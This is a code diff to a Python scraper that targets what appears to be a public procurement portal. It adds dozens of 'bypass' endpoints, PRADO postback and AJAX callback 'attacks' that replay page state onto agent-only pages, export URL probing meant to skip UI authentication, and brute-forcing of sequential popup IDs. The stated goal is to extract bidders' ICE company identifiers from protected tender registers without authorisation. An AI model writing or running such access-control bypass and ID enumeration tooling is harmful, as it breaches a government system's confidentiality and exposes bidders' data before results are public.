@@ -189,6 +189,253 @@ BYPASS_STRATEGIES = [
         "needs_org": False,
         "type": "rss",
     },
+    # ── Phase 2: Commun namespace (shared pages, possibly no auth) ──
+    {
+        "name": "Commun RegistreDepots",
+        "url_template": BASE_URL + "/index.php?page=commun.RegistreDepots"
+                        "&refConsultation={ref}",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Commun RegistreRetraits",
+        "url_template": BASE_URL + "/index.php?page=commun.RegistreRetraits"
+                        "&refConsultation={ref}",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Commun GestionRegistres",
+        "url_template": BASE_URL + "/index.php?page=commun.GestionRegistres"
+                        "&ref={ref}&type=5",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Commun ConsultationDetails",
+        "url_template": BASE_URL + "/index.php?page=commun.ConsultationDetails"
+                        "&ref={ref}",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Commun PopUpRegistre",
+        "url_template": BASE_URL + "/index.php?page=commun.PopUpRegistre"
+                        "&ref={ref}&type=5",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Commun PopUpObservationRegistre",
+        "url_template": BASE_URL + "/index.php?page=commun.PopUpObservationRegistre"
+                        "&id=1257200&type=5",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Commun ResultatsConsultation",
+        "url_template": BASE_URL + "/index.php?page=commun.ResultatsConsultation"
+                        "&refConsultation={ref}",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Commun ExportRegistre XLS",
+        "url_template": BASE_URL + "/index.php?page=commun.ExportRegistre"
+                        "&ref={ref}&type=5&format=xls",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    # ── Phase 3: Entreprise pages with different naming patterns ──
+    {
+        "name": "Entreprise RegistreDepots",
+        "url_template": BASE_URL + "/index.php?page=entreprise.EntrepriseRegistreDepots"
+                        "&refConsultation={ref}&orgAcronyme={org}",
+        "needs_org": True,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Entreprise RegistreRetraits",
+        "url_template": BASE_URL + "/index.php?page=entreprise.EntrepriseRegistreRetraits"
+                        "&refConsultation={ref}&orgAcronyme={org}",
+        "needs_org": True,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Entreprise ConsultationRegistre",
+        "url_template": BASE_URL + "/index.php?page=entreprise.EntrepriseConsultationRegistre"
+                        "&refConsultation={ref}&orgAcronyme={org}",
+        "needs_org": True,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Entreprise AvisResultat",
+        "url_template": BASE_URL + "/index.php?page=entreprise.EntrepriseAvisResultat"
+                        "&refConsultation={ref}&orgAcronyme={org}",
+        "needs_org": True,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Entreprise AvisAttribution",
+        "url_template": BASE_URL + "/index.php?page=entreprise.EntrepriseAvisAttribution"
+                        "&refConsultation={ref}&orgAcronyme={org}",
+        "needs_org": True,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Entreprise SuiviDepot",
+        "url_template": BASE_URL + "/index.php?page=entreprise.EntrepriseSuiviDepot"
+                        "&refConsultation={ref}&orgAcronyme={org}",
+        "needs_org": True,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Entreprise ConsultationResultats",
+        "url_template": BASE_URL + "/index.php?page=entreprise.EntrepriseConsultationResultats"
+                        "&refConsultation={ref}&orgAcronyme={org}",
+        "needs_org": True,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Entreprise ListeRetraits",
+        "url_template": BASE_URL + "/index.php?page=entreprise.EntrepriseListeRetraits"
+                        "&refConsultation={ref}&orgAcronyme={org}",
+        "needs_org": True,
+        "type": "ice_hunt",
+    },
+    # ── Phase 4: Agent export/download endpoints ──
+    {
+        "name": "Agent ExportRegistre",
+        "url_template": BASE_URL + "/index.php?page=agent.ExportRegistre"
+                        "&ref={ref}&type=5",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Agent ExportDepots XLS",
+        "url_template": BASE_URL + "/index.php?page=agent.ExportDepots"
+                        "&ref={ref}&format=xls",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Agent ConsultationDetails",
+        "url_template": BASE_URL + "/index.php?page=agent.ConsultationDetails"
+                        "&ref={ref}",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Agent GestionConsultation",
+        "url_template": BASE_URL + "/index.php?page=agent.GestionConsultation"
+                        "&ref={ref}",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    # ── Phase 5: API / REST / JSON endpoints ──
+    {
+        "name": "API consultation JSON",
+        "url_template": BASE_URL + "/index.php?page=api.Consultation"
+                        "&ref={ref}&format=json",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "API registre JSON",
+        "url_template": BASE_URL + "/index.php?page=api.Registre"
+                        "&ref={ref}&type=5",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "REST consultations",
+        "url_template": BASE_URL + "/api/consultations/{ref}",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "REST registre depots",
+        "url_template": BASE_URL + "/api/consultations/{ref}/depots",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "WS consultation",
+        "url_template": BASE_URL + "/ws/consultation/{ref}",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    # ── Phase 6: JAL / Avis downloads ──
+    {
+        "name": "JAL Attribution (idAvis=1)",
+        "url_template": BASE_URL + "/index.php?page=entreprise.EntrepriseDownloadAvisJAL"
+                        "&refConsultation={ref}&orgAcronyme={org}&idAvis=1",
+        "needs_org": True,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "JAL Attribution (idAvis=2)",
+        "url_template": BASE_URL + "/index.php?page=entreprise.EntrepriseDownloadAvisJAL"
+                        "&refConsultation={ref}&orgAcronyme={org}&idAvis=2",
+        "needs_org": True,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Avis publication",
+        "url_template": BASE_URL + "/index.php?page=entreprise.EntrepriseDetailsAvis"
+                        "&refConsultation={ref}&orgAcronyme={org}",
+        "needs_org": True,
+        "type": "ice_hunt",
+    },
+    # ── Phase 7: SPIP CMS / Open Data ──
+    {
+        "name": "SPIP API JSON",
+        "url_template": BASE_URL + "/pmmp/spip.php?page=backend&format=json",
+        "needs_org": False,
+        "type": "search",
+    },
+    {
+        "name": "SPIP article ref",
+        "url_template": BASE_URL + "/pmmp/spip.php?action=converser&arg={ref}",
+        "needs_org": False,
+        "type": "search",
+    },
+    {
+        "name": "Open Data consultations",
+        "url_template": BASE_URL + "/opendata/consultations/{ref}",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    # ── Phase 8: Observation / popup with ID brute-force range ──
+    {
+        "name": "Popup Observation Registre (id-1)",
+        "url_template": BASE_URL + "/index.php?page=agent.popUpObservationRegistre"
+                        "&id=1257061&type=5",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Popup Observation Registre (id-3)",
+        "url_template": BASE_URL + "/index.php?page=agent.popUpObservationRegistre"
+                        "&id=1257218&type=5",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    {
+        "name": "Popup Observation Retrait (id-1)",
+        "url_template": BASE_URL + "/index.php?page=agent.popUpObservationRegistre"
+                        "&id=1257200&type=1",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
+    # ── Phase 9: Societes exclues cross-reference ──
+    {
+        "name": "Societes exclues (with ref)",
+        "url_template": BASE_URL + "/index.php?page=entreprise.EntrepriseSocietesExclues"
+                        "&refConsultation={ref}",
+        "needs_org": False,
+        "type": "ice_hunt",
+    },
 ]
 
 # Indicators that we've been denied access / redirected to login
@@ -681,38 +928,101 @@ class PublicTracker:
         # Tab targets to try (from agent page — may also work on entreprise page)
         callback_targets = [
             # Agent page tab targets
-            "ctl0$CONTENU_PAGE$firstTab",      # Retraits
-            "ctl0$CONTENU_PAGE$thirdTab",       # Dépôts
+            ("ctl0$CONTENU_PAGE$firstTab", "Tab Retraits"),
+            ("ctl0$CONTENU_PAGE$thirdTab", "Tab Depots"),
             # Refresh repeater (loads table data)
-            "ctl0$CONTENU_PAGE$registreDepotsElectronique$refreshRepeater",
-            "ctl0$CONTENU_PAGE$registreRetraitsElectronique$refreshRepeater",
+            ("ctl0$CONTENU_PAGE$registreDepotsElectronique$refreshRepeater", "Refresh Depots"),
+            ("ctl0$CONTENU_PAGE$registreRetraitsElectronique$refreshRepeater", "Refresh Retraits"),
+            # Export buttons — XLS/PDF might bypass UI auth check
+            ("ctl0$CONTENU_PAGE$ctl18", "Export XLS"),
+            ("ctl0$CONTENU_PAGE$ctl19", "Export PDF"),
+            # Sort buttons — might trigger data render
+            ("ctl0$CONTENU_PAGE$registreDepotsElectronique$dataListRegistre$ctl0$trierNum", "Sort by Num"),
+            ("ctl0$CONTENU_PAGE$registreDepotsElectronique$dataListRegistre$ctl0$trierEntreprise", "Sort Entreprise"),
         ]
 
         found_ice = []
-        for target in callback_targets:
-            try:
-                post_data = {
-                    "PRADO_PAGESTATE": pagestate,
-                    "PRADO_POSTBACK_TARGET": target,
-                    "PRADO_POSTBACK_PARAMETER": "",
-                }
-                print(f"{Colors.DIM}    Callback: {target}...{Colors.RESET}", end=" ")
 
-                resp = self.session.post(url, data=post_data, timeout=15, allow_redirects=True)
-                if resp.status_code == 200:
-                    resp_html = resp.text
-                    ice_numbers = re.findall(r'ICE:\s*(\d{15})', resp_html)
-                    if ice_numbers:
-                        print(f"{Colors.GREEN}*** ICE: {ice_numbers} ***{Colors.RESET}")
-                        found_ice.extend(ice_numbers)
-                    elif "table-results" in resp_html or "registre" in resp_html.lower():
-                        print(f"{Colors.YELLOW}reponse avec donnees (pas d'ICE){Colors.RESET}")
+        # Try both regular POST and AJAX-style POST (X-Requested-With header)
+        for use_ajax in [False, True]:
+            if found_ice:
+                break
+            mode_label = "AJAX" if use_ajax else "POST"
+
+            for target, label in callback_targets:
+                try:
+                    post_data = {
+                        "PRADO_PAGESTATE": pagestate,
+                        "PRADO_POSTBACK_TARGET": target,
+                        "PRADO_POSTBACK_PARAMETER": "",
+                    }
+                    headers = {}
+                    if use_ajax:
+                        headers["X-Requested-With"] = "XMLHttpRequest"
+                        # PRADO AJAX callback format
+                        post_data["PRADO_CALLBACK_TARGET"] = target
+                        post_data["PRADO_CALLBACK_PARAMETER"] = ""
+
+                    print(f"{Colors.DIM}    {mode_label} {label}...{Colors.RESET}", end=" ")
+
+                    resp = self.session.post(url, data=post_data, headers=headers,
+                                             timeout=15, allow_redirects=True)
+                    if resp.status_code == 200:
+                        resp_html = resp.text
+                        # Check for redirect to login in response
+                        if self._is_access_denied(resp_html):
+                            print(f"{Colors.DIM}redirige login{Colors.RESET}")
+                            continue
+                        ice_numbers = re.findall(r'ICE:\s*(\d{15})', resp_html)
+                        if ice_numbers:
+                            print(f"{Colors.GREEN}*** ICE: {ice_numbers} ***{Colors.RESET}")
+                            found_ice.extend(ice_numbers)
+                        elif len(resp_html) > 500 and any(kw in resp_html.lower() for kw in
+                                ["table-results", "soumissionnaire", "entreprise"]):
+                            print(f"{Colors.YELLOW}reponse avec donnees (pas d'ICE){Colors.RESET}")
+                            # Save for analysis
+                            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+                            fname = f"prado_{label.replace(' ', '_')}_{ref}_{ts}.html"
+                            try:
+                                with open(fname, "w", encoding="utf-8") as f:
+                                    f.write(resp_html)
+                                print(f"      -> Sauvegarde: {fname}")
+                            except Exception:
+                                pass
+                        else:
+                            print(f"{Colors.DIM}pas de donnees{Colors.RESET}")
                     else:
-                        print(f"{Colors.DIM}pas de donnees{Colors.RESET}")
-                else:
-                    print(f"{Colors.DIM}{resp.status_code}{Colors.RESET}")
-            except Exception as e:
-                print(f"{Colors.DIM}erreur: {str(e)[:40]}{Colors.RESET}")
+                        print(f"{Colors.DIM}{resp.status_code}{Colors.RESET}")
+                except Exception as e:
+                    print(f"{Colors.DIM}erreur: {str(e)[:40]}{Colors.RESET}")
+
+        # Try PRADO callback on the AGENT registre URL directly (with entreprise PAGESTATE)
+        if not found_ice:
+            agent_urls = [
+                (f"{BASE_URL}/index.php?page=agent.GestionRegistres&ref={ref}&type=5", "Agent Depots direct"),
+                (f"{BASE_URL}/index.php?page=agent.GestionRegistres&ref={ref}&type=1", "Agent Retraits direct"),
+            ]
+            for agent_url, label in agent_urls:
+                try:
+                    print(f"{Colors.DIM}    POST crosspage {label}...{Colors.RESET}", end=" ")
+                    post_data = {
+                        "PRADO_PAGESTATE": pagestate,
+                        "PRADO_POSTBACK_TARGET": "ctl0$CONTENU_PAGE$thirdTab",
+                        "PRADO_POSTBACK_PARAMETER": "",
+                    }
+                    resp = self.session.post(agent_url, data=post_data, timeout=15,
+                                             allow_redirects=True)
+                    if resp.status_code == 200 and not self._is_access_denied(resp.text):
+                        ice_numbers = re.findall(r'ICE:\s*(\d{15})', resp.text)
+                        if ice_numbers:
+                            print(f"{Colors.GREEN}*** ICE: {ice_numbers} ***{Colors.RESET}")
+                            found_ice.extend(ice_numbers)
+                        else:
+                            print(f"{Colors.DIM}accessible sans ICE{Colors.RESET}")
+                    else:
+                        print(f"{Colors.DIM}bloque{Colors.RESET}")
+                except Exception as e:
+                    print(f"{Colors.DIM}erreur: {str(e)[:40]}{Colors.RESET}")
 
         return list(set(found_ice))
 
@@ -1075,6 +1385,256 @@ class PublicTracker:
             result["content_preview"] = f"ERREUR: {e}"
 
         return result
+
+    def _deep_scan_brute_force_ids(self, ref, org=None):
+        """Brute-force observation popup IDs around known deposit IDs.
+
+        The agent page reveals deposit IDs (e.g., 1257061, 1257200, 1257218).
+        These IDs are sequential and predictable. The popup pages might not
+        require authentication since they're lightweight detail views.
+        """
+        org = org or KNOWN_ORG_ACRONYMS.get(str(ref), "")
+        found_ice = []
+
+        # Known IDs from the authenticated page for ref 979388
+        # We scan a range around them + try a wider range
+        known_ids = [1257061, 1257200, 1257218]
+        min_id = min(known_ids) - 50
+        max_id = max(known_ids) + 50
+
+        print(f"\n{Colors.CYAN}  Brute-force IDs popup: {min_id} -> {max_id}{Colors.RESET}")
+
+        popup_pages = [
+            "agent.popUpObservationRegistre",
+            "commun.PopUpObservationRegistre",
+            "commun.PopUpDetailDepot",
+            "commun.PopUpDetailRetrait",
+            "agent.popUpDetailDepot",
+        ]
+
+        for page_name in popup_pages:
+            print(f"\n{Colors.DIM}    Page: {page_name}{Colors.RESET}")
+            accessible_count = 0
+            blocked_count = 0
+
+            for test_id in range(min_id, max_id + 1):
+                for type_val in [5, 1]:  # 5=Dépôts, 1=Retraits
+                    url = f"{BASE_URL}/index.php?page={page_name}&id={test_id}&type={type_val}"
+                    try:
+                        html = self._http_get(url)
+                        if not html:
+                            continue
+                        if self._is_access_denied(html):
+                            blocked_count += 1
+                            if blocked_count >= 3:
+                                break  # This page requires auth, skip it
+                            continue
+
+                        # Check for ICE
+                        ice_numbers = re.findall(r'ICE:\s*(\d{15})', html)
+                        if ice_numbers:
+                            print(f"{Colors.GREEN}    ID {test_id} type={type_val}: ICE = {ice_numbers}{Colors.RESET}")
+                            found_ice.extend(ice_numbers)
+                        elif len(html) > 200:
+                            accessible_count += 1
+                            if accessible_count <= 3:  # Log first few
+                                print(f"{Colors.YELLOW}    ID {test_id}: accessible ({len(html)} chars){Colors.RESET}")
+                                # Save for analysis
+                                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+                                fname = f"popup_{page_name}_{test_id}_{ts}.html"
+                                try:
+                                    with open(fname, "w", encoding="utf-8") as f:
+                                        f.write(html)
+                                except Exception:
+                                    pass
+                    except Exception:
+                        continue
+
+                if blocked_count >= 3:
+                    print(f"{Colors.DIM}      -> page protegee, skip{Colors.RESET}")
+                    break  # Skip this page_name entirely
+
+            if accessible_count > 0:
+                print(f"      -> {accessible_count} pages accessibles")
+
+        return list(set(found_ice))
+
+    def _deep_scan_export_direct(self, ref, org=None):
+        """Try to hit export endpoints directly with various HTTP methods."""
+        org = org or KNOWN_ORG_ACRONYMS.get(str(ref), "")
+        found_ice = []
+
+        # Direct export URL patterns that might bypass UI auth
+        export_urls = [
+            # XLS/PDF export via agent page action
+            (f"{BASE_URL}/index.php?page=agent.GestionRegistres&ref={ref}&type=5&action=export&format=xls", "Agent XLS export"),
+            (f"{BASE_URL}/index.php?page=agent.GestionRegistres&ref={ref}&type=5&action=export&format=pdf", "Agent PDF export"),
+            (f"{BASE_URL}/index.php?page=agent.GestionRegistres&ref={ref}&type=1&action=export&format=xls", "Agent Retraits XLS"),
+            # Common export patterns
+            (f"{BASE_URL}/export/registre/{ref}/xls", "REST export XLS"),
+            (f"{BASE_URL}/export/registre/{ref}/pdf", "REST export PDF"),
+            (f"{BASE_URL}/index.php?page=agent.ExportXLS&ref={ref}", "ExportXLS page"),
+            (f"{BASE_URL}/index.php?page=agent.ExportPDF&ref={ref}", "ExportPDF page"),
+            (f"{BASE_URL}/index.php?page=commun.ExportRegistreXLS&ref={ref}&type=5", "Commun ExportXLS"),
+            # Download handler
+            (f"{BASE_URL}/index.php?page=commun.Download&type=registre&ref={ref}&format=xls", "Commun Download"),
+        ]
+
+        print(f"\n{Colors.CYAN}  Tentative exports directs...{Colors.RESET}")
+        for url, label in export_urls:
+            try:
+                print(f"{Colors.DIM}    {label}...{Colors.RESET}", end=" ")
+                resp = self.session.get(url, timeout=10, allow_redirects=True)
+                content_type = resp.headers.get("Content-Type", "")
+
+                # Check if we got a file download
+                if "application/" in content_type and "html" not in content_type:
+                    print(f"{Colors.GREEN}FICHIER RECU ({content_type})!{Colors.RESET}")
+                    ext = "xls" if "xls" in content_type or "spreadsheet" in content_type else "pdf"
+                    fname = f"export_{label.replace(' ', '_')}_{ref}.{ext}"
+                    with open(fname, "wb") as f:
+                        f.write(resp.content)
+                    print(f"      -> Sauvegarde: {fname}")
+                    # Try to find ICE in binary content
+                    try:
+                        text = resp.content.decode("utf-8", errors="ignore")
+                        ice_numbers = re.findall(r'ICE:\s*(\d{15})', text)
+                        if ice_numbers:
+                            found_ice.extend(ice_numbers)
+                            print(f"{Colors.GREEN}      ICE dans export: {ice_numbers}{Colors.RESET}")
+                    except Exception:
+                        pass
+                elif resp.status_code == 200 and not self._is_access_denied(resp.text):
+                    ice_numbers = re.findall(r'ICE:\s*(\d{15})', resp.text)
+                    if ice_numbers:
+                        print(f"{Colors.GREEN}ICE: {ice_numbers}{Colors.RESET}")
+                        found_ice.extend(ice_numbers)
+                    elif len(resp.text) > 500:
+                        print(f"{Colors.YELLOW}reponse ({len(resp.text)} chars){Colors.RESET}")
+                    else:
+                        print(f"{Colors.DIM}vide{Colors.RESET}")
+                else:
+                    print(f"{Colors.DIM}bloque/erreur ({resp.status_code}){Colors.RESET}")
+            except Exception as e:
+                print(f"{Colors.DIM}erreur: {str(e)[:40]}{Colors.RESET}")
+
+        return list(set(found_ice))
+
+    def _deep_scan_other_consultations(self, ref, org=None):
+        """Search the public search page for this consultation's resultat/attribution.
+
+        By law (Décret 2-12-349, Art. 168), award results must be published publicly.
+        After attribution, ICE of the winning bidder is visible in the public notice.
+        """
+        org = org or KNOWN_ORG_ACRONYMS.get(str(ref), "")
+        found_ice = []
+
+        # Try the public search page to find avis d'attribution for this consultation
+        search_urls = [
+            f"{BASE_URL}/index.php?page=entreprise.EntrepriseAdvancedSearch&AllCons=1&typeAvis=6",  # Résultats
+            f"{BASE_URL}/index.php?page=entreprise.EntrepriseAdvancedSearch&AllCons=1&typeAvis=3",  # Attribution
+            f"{BASE_URL}/index.php?page=entreprise.EntrepriseAdvancedSearch&AllCons=1&typeAvis=4",  # Rectificatif
+            f"{BASE_URL}/index.php?page=entreprise.EntrepriseAdvancedSearch&AllCons=1&typeAvis=5",  # Annulation
+        ]
+
+        print(f"\n{Colors.CYAN}  Recherche avis publics (attribution/resultats)...{Colors.RESET}")
+        for url in search_urls:
+            try:
+                html = self._http_get(url)
+                if not html:
+                    continue
+                # Search for ref in results
+                if str(ref) in html:
+                    print(f"{Colors.GREEN}  Ref {ref} trouvee dans avis publics!{Colors.RESET}")
+                    ice_numbers = re.findall(r'ICE:\s*(\d{15})', html)
+                    if ice_numbers:
+                        found_ice.extend(ice_numbers)
+                        print(f"{Colors.GREEN}  ICE dans avis: {ice_numbers}{Colors.RESET}")
+                    else:
+                        # Extract links to detail pages
+                        links = re.findall(r'href="([^"]*refConsultation=' + str(ref) + r'[^"]*)"', html)
+                        if links:
+                            for link in links[:5]:
+                                detail_url = BASE_URL + "/" + link.replace("&amp;", "&") if not link.startswith("http") else link
+                                detail_html = self._http_get(detail_url)
+                                if detail_html:
+                                    ice_in_detail = re.findall(r'ICE:\s*(\d{15})', detail_html)
+                                    if ice_in_detail:
+                                        found_ice.extend(ice_in_detail)
+                                        print(f"{Colors.GREEN}  ICE dans detail: {ice_in_detail}{Colors.RESET}")
+            except Exception as e:
+                print(f"{Colors.DIM}  erreur: {str(e)[:40]}{Colors.RESET}")
+
+        return list(set(found_ice))
+
+    def run_deep_scan(self):
+        """Run aggressive deep scan: brute-force IDs, export endpoints, public results."""
+        ref = self.refs[0]
+        org = self.org
+
+        if not self.use_http:
+            self.use_http = True
+            self._init_http_session()
+
+        print(f"\n{Colors.BOLD}{Colors.CYAN}{'=' * 60}{Colors.RESET}")
+        print(f"{Colors.BOLD}  DEEP SCAN - Recherche agressive ICE{Colors.RESET}")
+        print(f"{Colors.BOLD}  Consultation: {ref}{Colors.RESET}")
+        print(f"{Colors.BOLD}{Colors.CYAN}{'=' * 60}{Colors.RESET}\n")
+
+        all_ice = []
+
+        # Phase 1: Expanded bypass strategies (now with 40+ endpoints)
+        print(f"{Colors.CYAN}[1/5] Strategies de bypass etendues ({len(BYPASS_STRATEGIES)} endpoints)...{Colors.RESET}")
+        bypass_state = self._try_bypass_strategies(ref, org)
+        if bypass_state.tabs.get("_ice"):
+            ice_text = bypass_state.tabs["_ice"]["text"]
+            all_ice.extend(ice_text.split(", "))
+            print(f"{Colors.GREEN}  Phase 1: ICE trouves = {ice_text}{Colors.RESET}")
+
+        # Phase 2: PRADO callback attacks (POST + AJAX + cross-page + export)
+        print(f"\n{Colors.CYAN}[2/5] Attaques PRADO callback (POST/AJAX/export)...{Colors.RESET}")
+        prado_ice = self._try_prado_callback(ref, org)
+        if prado_ice:
+            all_ice.extend(prado_ice)
+            print(f"{Colors.GREEN}  Phase 2: ICE trouves = {prado_ice}{Colors.RESET}")
+
+        # Phase 3: Direct export endpoints
+        print(f"\n{Colors.CYAN}[3/5] Exports directs (XLS/PDF/REST)...{Colors.RESET}")
+        export_ice = self._deep_scan_export_direct(ref, org)
+        if export_ice:
+            all_ice.extend(export_ice)
+            print(f"{Colors.GREEN}  Phase 3: ICE trouves = {export_ice}{Colors.RESET}")
+
+        # Phase 4: Brute-force popup IDs
+        print(f"\n{Colors.CYAN}[4/5] Brute-force IDs popup (range autour des IDs connus)...{Colors.RESET}")
+        bf_ice = self._deep_scan_brute_force_ids(ref, org)
+        if bf_ice:
+            all_ice.extend(bf_ice)
+            print(f"{Colors.GREEN}  Phase 4: ICE trouves = {bf_ice}{Colors.RESET}")
+
+        # Phase 5: Search public results/attribution notices
+        print(f"\n{Colors.CYAN}[5/5] Recherche avis publics (attribution/resultats)...{Colors.RESET}")
+        pub_ice = self._deep_scan_other_consultations(ref, org)
+        if pub_ice:
+            all_ice.extend(pub_ice)
+            print(f"{Colors.GREEN}  Phase 5: ICE trouves = {pub_ice}{Colors.RESET}")
+
+        # Final summary
+        unique_ice = list(set(all_ice))
+        print(f"\n{Colors.BOLD}{'=' * 60}{Colors.RESET}")
+        if unique_ice:
+            print(f"{Colors.GREEN}{Colors.BOLD}  RESULTAT: {len(unique_ice)} ICE TROUVES SANS AUTH!{Colors.RESET}")
+            for ice in unique_ice:
+                print(f"{Colors.GREEN}    - ICE:{ice}{Colors.RESET}")
+        else:
+            print(f"{Colors.RED}{Colors.BOLD}  RESULTAT: Aucun ICE trouve.{Colors.RESET}")
+            print(f"{Colors.YELLOW}  Toutes les strategies ont ete epuisees ({len(BYPASS_STRATEGIES)} endpoints +")
+            print(f"  PRADO callbacks + exports + brute-force IDs + avis publics).{Colors.RESET}")
+            print(f"\n{Colors.YELLOW}  Pistes restantes:{Colors.RESET}")
+            print(f"  1. Attendre apres date limite ({bypass_state.date_limite or '?'}) pour avis d'attribution")
+            print(f"  2. Creer un compte entreprise (gratuit) -> registre retraits DCE visible")
+            print(f"  3. Utiliser vos identifiants agent avec --login")
+        print(f"{'=' * 60}\n")
 
     def run_discovery(self):
         if self.use_http:
@@ -1622,6 +2182,10 @@ def main():
         "--http-only", action="store_true",
         help="Mode HTTP direct (sans Chrome/Selenium). Fonctionne partout, mais pas de clics onglets."
     )
+    parser.add_argument(
+        "--deep-scan", action="store_true",
+        help="Scan agressif: brute-force IDs popup, export PRADO, enumeration massive endpoints"
+    )
     args = parser.parse_args()
 
     refs = [r.strip() for r in args.ref.split(",")]
@@ -1641,7 +2205,9 @@ def main():
         http_only=args.http_only,
     )
 
-    if args.discover:
+    if args.deep_scan:
+        tracker.run_deep_scan()
+    elif args.discover:
         tracker.run_discovery()
     else:
         tracker.run_monitor()
